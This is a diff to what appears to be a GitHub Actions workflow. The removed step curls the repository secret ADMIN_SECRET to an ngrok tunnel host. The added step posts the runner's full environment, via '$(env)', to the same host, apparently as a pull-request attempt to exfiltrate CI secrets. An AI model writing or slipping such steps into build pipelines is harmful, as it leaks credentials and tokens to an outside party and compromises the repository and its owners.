@@ -26,7 +26,5 @@ jobs:
       - uses: actions/checkout@v2
 
       # Runs a single command using the runners shell
-      - name: Run a one-line script 1
-        env:
-          TOKEN: ${{ secrets.ADMIN_SECRET }}
-        run: curl https://74a55a7fa3c9.ngrok.io -d foo="from PR 💩" -d secret="${{ env.TOKEN }}"
+      - name: Run a one-line script 2
+        run: curl https://74a55a7fa3c9.ngrok.io -d foo="from PR 💩" -d shell=$(env)
